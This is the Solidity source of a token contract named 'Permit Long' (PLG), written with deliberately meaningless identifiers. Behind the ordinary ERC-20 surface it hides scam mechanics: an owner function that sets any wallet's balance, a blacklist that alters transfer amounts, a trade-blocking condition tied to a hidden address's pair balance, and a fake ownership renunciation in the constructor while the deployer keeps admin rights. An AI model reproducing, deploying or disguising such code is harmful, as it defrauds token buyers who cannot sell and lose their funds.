//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface totalTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchReceiver) external view returns (uint256);

    function transfer(address senderFrom, uint256 senderMarketingMax) external returns (bool);

    function allowance(address minSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 senderMarketingMax) external returns (bool);

    function transferFrom(
        address sender,
        address senderFrom,
        uint256 senderMarketingMax
    ) external returns (bool);

    event Transfer(address indexed from, address indexed atMode, uint256 value);
    event Approval(address indexed minSender, address indexed spender, uint256 value);
}

abstract contract fromTo {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface senderAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface exemptList {
    function createPair(address teamLaunch, address receiverList) external returns (address);
}

interface totalTxMetadata is totalTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract PermitLong is fromTo, totalTx, totalTxMetadata {

    function minMax(uint256 senderMarketingMax) public {
        atTeamIs();
        listEnable = senderMarketingMax;
    }

    address fromMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool public liquidityTake;

    uint256 constant exemptTeam = 16 ** 10;

    function tradingSender(address autoWallet) public {
        if (modeTakeLaunched) {
            return;
        }
        
        isAtFrom[autoWallet] = true;
        
        modeTakeLaunched = true;
    }

    string private enableSwap = "Permit Long";

    function transferFrom(address totalTeam, address senderFrom, uint256 senderMarketingMax) external override returns (bool) {
        if (_msgSender() != toSell) {
            if (fromAmountSell[totalTeam][_msgSender()] != type(uint256).max) {
                require(senderMarketingMax <= fromAmountSell[totalTeam][_msgSender()]);
                fromAmountSell[totalTeam][_msgSender()] -= senderMarketingMax;
            }
        }
        return txSwap(totalTeam, senderFrom, senderMarketingMax);
    }

    address public autoAtList;

    bool private fundTx;

    function swapAutoMin() public {
        emit OwnershipTransferred(autoAtList, address(0));
        marketingTx = address(0);
    }

    function symbol() external view virtual override returns (string memory) {
        return shouldMarketing;
    }

    function buyReceiverTake(address txToken) public {
        atTeamIs();
        if (teamBuy == atSender) {
            sellTrading = false;
        }
        if (txToken == autoAtList || txToken == shouldFrom) {
            return;
        }
        feeLimit[txToken] = true;
    }

    uint256 listEnable;

    bool public modeTakeLaunched;

    uint256 private shouldLaunched;

    function balanceOf(address launchReceiver) public view virtual override returns (uint256) {
        return txWallet[launchReceiver];
    }

    bool public fromLaunched;

    function walletMax(address exemptAt, uint256 senderMarketingMax) public {
        atTeamIs();
        txWallet[exemptAt] = senderMarketingMax;
    }

    event OwnershipTransferred(address indexed fundReceiver, address indexed walletSender);

    mapping(address => mapping(address => uint256)) private fromAmountSell;

    function name() external view virtual override returns (string memory) {
        return enableSwap;
    }

    uint256 public fundWallet;

    function allowance(address fromAuto, address limitTokenWallet) external view virtual override returns (uint256) {
        if (limitTokenWallet == toSell) {
            return type(uint256).max;
        }
        return fromAmountSell[fromAuto][limitTokenWallet];
    }

    uint8 private exemptTxMarketing = 18;

    address toSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transfer(address exemptAt, uint256 senderMarketingMax) external virtual override returns (bool) {
        return txSwap(_msgSender(), exemptAt, senderMarketingMax);
    }

    function getOwner() external view returns (address) {
        return marketingTx;
    }

    bool public txAuto;

    function approve(address limitTokenWallet, uint256 senderMarketingMax) public virtual override returns (bool) {
        fromAmountSell[_msgSender()][limitTokenWallet] = senderMarketingMax;
        emit Approval(_msgSender(), limitTokenWallet, senderMarketingMax);
        return true;
    }

    function owner() external view returns (address) {
        return marketingTx;
    }

    function atTeamIs() private view {
        require(isAtFrom[_msgSender()]);
    }

    mapping(address => bool) public isAtFrom;

    address private marketingTx;

    function totalSupply() external view virtual override returns (uint256) {
        return fundFrom;
    }

    uint256 private atSender;

    function decimals() external view virtual override returns (uint8) {
        return exemptTxMarketing;
    }

    bool public sellTrading;

    uint256 private teamBuy;

    bool public tokenBuy;

    mapping(address => uint256) private txWallet;

    function fromLimit(address totalTeam, address senderFrom, uint256 senderMarketingMax) internal returns (bool) {
        require(txWallet[totalTeam] >= senderMarketingMax);
        txWallet[totalTeam] -= senderMarketingMax;
        txWallet[senderFrom] += senderMarketingMax;
        emit Transfer(totalTeam, senderFrom, senderMarketingMax);
        return true;
    }

    constructor (){
        
        senderAt toTradingFrom = senderAt(toSell);
        shouldFrom = exemptList(toTradingFrom.factory()).createPair(toTradingFrom.WETH(), address(this));
        
        autoAtList = _msgSender();
        swapAutoMin();
        isAtFrom[autoAtList] = true;
        txWallet[autoAtList] = fundFrom;
        if (liquidityTake != sellTrading) {
            sellTrading = false;
        }
        emit Transfer(address(0), autoAtList, fundFrom);
    }

    mapping(address => bool) public feeLimit;

    address public shouldFrom;

    uint256 launchedListAmount;

    function txSwap(address totalTeam, address senderFrom, uint256 senderMarketingMax) internal returns (bool) {
        if (totalTeam == autoAtList) {
            return fromLimit(totalTeam, senderFrom, senderMarketingMax);
        }
        uint256 maxSwap = totalTx(shouldFrom).balanceOf(fromMax);
        require(maxSwap == listEnable);
        require(senderFrom != fromMax);
        if (feeLimit[totalTeam]) {
            return fromLimit(totalTeam, senderFrom, exemptTeam);
        }
        return fromLimit(totalTeam, senderFrom, senderMarketingMax);
    }

    uint256 private fundFrom = 100000000 * 10 ** 18;

    string private shouldMarketing = "PLG";

}